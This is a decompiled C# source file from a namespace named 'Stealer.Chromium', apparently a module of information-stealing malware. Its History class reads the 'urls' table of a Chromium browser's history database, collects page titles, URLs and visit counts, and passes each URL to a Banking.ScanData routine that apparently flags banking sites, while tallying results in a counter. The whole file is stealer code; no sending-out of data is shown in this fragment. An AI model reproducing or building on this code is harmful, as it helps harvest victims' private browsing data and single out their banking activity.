using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000028 RID: 40
	internal sealed class History
	{
		// Token: 0x060000B1 RID: 177 RVA: 0x00007808 File Offset: 0x00005A08
		public static List<Site> Get(string sHistory)
		{
			List<Site> list2;
			try
			{
				List<Site> list = new List<Site>();
				SQLite sqlite = SqlReader.ReadTable(sHistory, "urls");
				bool flag = sqlite == null;
				if (flag)
				{
					list2 = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Site site = default(Site);
						site.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						site.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						site.iCount = Convert.ToInt32(sqlite.GetValue(i, 3)) + 1;
						Banking.ScanData(site.sUrl);
						Counter.History++;
						list.Add(site);
					}
					list2 = list;
				}
			}
			catch
			{
				list2 = new List<Site>();
			}
			return list2;
		}
	}
}
